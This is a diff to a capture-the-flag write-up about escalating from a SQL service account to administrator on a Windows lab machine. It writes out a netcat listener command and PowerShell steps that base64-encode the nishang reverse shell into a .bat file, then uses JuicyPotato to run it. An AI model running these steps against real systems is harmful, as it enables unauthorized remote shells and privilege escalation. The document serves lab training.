@@ -171,15 +171,24 @@ To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 80
 
 <img src="Images/shell.png" width=500>
 
-then I'll `cd` into my home directory `C:\Users\sqlsvc` which I have write permissions over. Next I'll download JuicyPotato.exe from github and transfer it into my home directory on the target, saving it as jp.exe.
+then I'll `cd` into my home directory `C:\Users\sqlsvc` which I have write permissions over. Next I'll download JuicyPotato.exe from github and transfer it into my home directory on the target, saving it as `jp.exe`.
 
 <img src="Images/jp.png" width=500>
 
-Now I'll create a `.bat` file containing the base64 encoded nishang reverse shell by running the commands
+Now I'll create `shell.bat` on my local box containing the base64 encoded nishang reverse shell to send me a reverse shell on port 9001 by running the commands
 ```
 └─PS> $Data = get-content ./Invoke-PowerShellTcp.ps1 
 └─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
 └─PS> $EncodedData = [Convert]::ToBase64String($Bytes)                                        
 └─PS> $EncodedData | Out-File shell.bat                                                                                                                   
 ```
-in the linux powershell console, and prepending `powershell -EncodedCommand ` to `shell.bat`. A `.bat` file will be executed immediately upon opening.
+in the linux powershell console, and prepending `powershell -EncodedCommand ` to `shell.bat`. A `.bat` file will be executed immediately upon opening. Next I'll transfer the bat file to the target in the usual way, saving it as `C:\Users\sqlsvc\shell.bat`.
+Then I'll run 
+
+<img src="Images/success.png" width=500>
+
+and on my listener I get a hit
+
+<img src="Images/whoami.png" width=500>
+
+and from here I can get the root flag in `C:\Users\Administrator\Desktop\root.txt`
